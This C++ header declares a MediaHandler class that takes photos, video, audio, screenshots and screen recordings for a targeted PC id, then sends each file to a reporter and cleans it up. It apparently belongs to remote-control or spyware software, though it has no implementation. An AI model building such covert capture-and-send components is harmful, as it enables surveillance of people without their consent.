#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"
#include "application/interfaces/IMediaCapture.hpp"

namespace nuub::application::commands {

class MediaHandler {
    interfaces::IMediaCapture& capture_;
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;
    void send_and_cleanup(const std::string& path, const std::string& caption);

public:
    MediaHandler(
        interfaces::IMediaCapture& capture,
        interfaces::IReporter& reporter,
        std::string pc_id);

    domain::Result<void> handle_take_photo(const std::string& target);
    domain::Result<void> handle_take_video(const std::string& target, int duration = 10);
    domain::Result<void> handle_record_audio(const std::string& target, int duration = 10);
    domain::Result<void> handle_screenshot(const std::string& target);
    domain::Result<void> handle_screenrecord(const std::string& target, int duration = 10);
};

} // namespace nuub::application::commands
